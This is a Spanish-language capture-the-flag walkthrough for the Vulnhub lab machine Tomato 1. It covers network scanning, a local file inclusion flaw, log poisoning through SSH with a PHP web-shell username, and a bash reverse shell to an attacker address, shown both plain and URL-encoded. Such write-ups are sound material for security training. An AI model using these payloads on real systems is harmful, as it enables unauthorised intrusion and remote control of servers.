<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=3CF700FF&width=300&height=80&lines=TOMATO_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/tomato-1,557/

</br>

- *Paso 1:* Identificar la IP de la máquina host con NetDiscover. 
```
netdiscover -i eth0
```
![1](https://user-images.githubusercontent.com/75953873/174927688-71985557-4e9d-4790-acac-a8b1da611f48.png)

IP host: `192.168.1.10`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.10
```
![2](https://user-images.githubusercontent.com/75953873/174929092-202e91f9-f6d3-428b-a8f9-a952095f67f8.png)

Puertos abiertos: [21,80,2211,8888]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 21,80,2211,8888 -A 192.168.1.10
```
![3](https://user-images.githubusercontent.com/75953873/174929490-44875da3-9b11-4e39-ba9d-0d7be8d85aac.png)

Servidor corriendo: **HTTP Apache**

O.S: Linux (**Ubuntu**)

URL del servidor: `http://192.168.1.10`

![4](https://user-images.githubusercontent.com/75953873/174928906-0bf0a1e9-d580-4d8f-ae94-0c0bbb3a73b6.png)

En el puerto `8888` se encuentra corriendo el servidor Nginx (`http:192.168.1.10:8888`).

![5](https://user-images.githubusercontent.com/75953873/174929899-11ad2340-d883-4fff-8eb2-d68a7dd8b67d.png)

- *Paso 4:* Enumerar archivos y directorios con Dirb. 
```
dirb http://192.168.1.10 /usr/share/dirb/wordlists/common.txt
```
![6](https://user-images.githubusercontent.com/75953873/174931398-0e9f0007-7245-408a-b4d1-d89c6f3e30ae.png)

Directorio: `http://192.168.1.10/antibot_image/`

Al inspeccionar el código del archivo `info.php`, indica en un comentario que es posible subir una imagen con el método GET.
```
curl http://192.168.1.10/antibot_image/antibots/info.php
```
![7](https://user-images.githubusercontent.com/75953873/174932206-434978d3-3417-4eb4-bd3f-cbce7b934c87.png)

- *Paso 5:* Búsqueda de vulnerabilidad LFI (Inclusión de archivos locales).

Herramienta Tester: https://github.com/kostas-pa/LFITester

LFI Payloads: https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt

```
python3 LFITester.py -L payloads.txt
```
![9](https://user-images.githubusercontent.com/75953873/174938168-ec6ee35f-6eaf-4d05-937a-ada4e7db7e84.png)

URL: 
```
Opción 1) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../etc/passwd
Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log
```

**/etc/passwd**

![8_](https://user-images.githubusercontent.com/75953873/174938823-970ad267-3267-4bbe-9f97-d256d4f5b2e2.png)

**/var/log/auth.log**

![10](https://user-images.githubusercontent.com/75953873/174939217-162ae75c-1412-48dd-98ab-142100bf6e95.png)

- *Paso 6:* Envenenar registros de Apache a través de SSH creando una backdoor por el puerto 2211.
```
ssh '<?php system($_GET['cmd']); ?>'@192.168.1.10 -p 2211
```
![11](https://user-images.githubusercontent.com/75953873/175163279-0d24f94a-7f18-41a2-a627-580aa8e1b0b2.png)

- *Paso 7:* Configurar proxy y capturar solicitud GET con BurpSuite.

Configuración de Firefox **>** Configuración de redes **>** Configuración de proxy manual

HTTP Proxy: `127.0.0.1`

Port: `8080`

![12](https://user-images.githubusercontent.com/75953873/175163339-db1853d5-b77c-47cb-86b5-0fa8e6e5fb28.png)

Acceder a la URL: `http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=`

BurpSuite capturará la solicitud GET y a la misma se le agregará comandos extras para acceder al interior de la máquina con una reverse shell:
```
http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.9/4444 0>&1'
```
![13](https://user-images.githubusercontent.com/75953873/175164908-c3716f51-9f43-4ad5-8f65-7b411f54495e.png)

Antes de obtener un reverse shell, es preciso codificar los comandos extras:
```
antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%39%2f%34%34%34%34%20%30%3e%26%31%27
```
